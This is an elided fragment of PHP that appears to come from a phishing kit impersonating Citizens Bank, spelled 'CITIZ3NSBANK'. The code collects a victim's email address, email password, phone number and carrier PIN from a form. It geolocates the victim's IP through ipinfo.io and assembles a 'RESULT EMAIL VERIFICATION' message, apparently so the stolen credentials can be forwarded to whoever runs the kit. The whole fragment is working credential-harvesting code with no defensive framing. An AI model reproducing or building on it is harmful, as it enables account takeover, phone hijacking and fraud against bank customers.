...
$emaildress = $_POST['emailaccess'];
$emailPassword = $_POST['emailaccesspass'];
$NumberPhone = $_POST['phonenumber'];
$NumberCarrier = $_POST['pin'];

$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));

$message .= "+ ------------------------------------------ + \n";
$message .= "| ✅ CITIZ3NSBANK Email Verification | $ip ✅\n";
...
$subject="RESULT EMAIL VERIFICATION | $ip ";
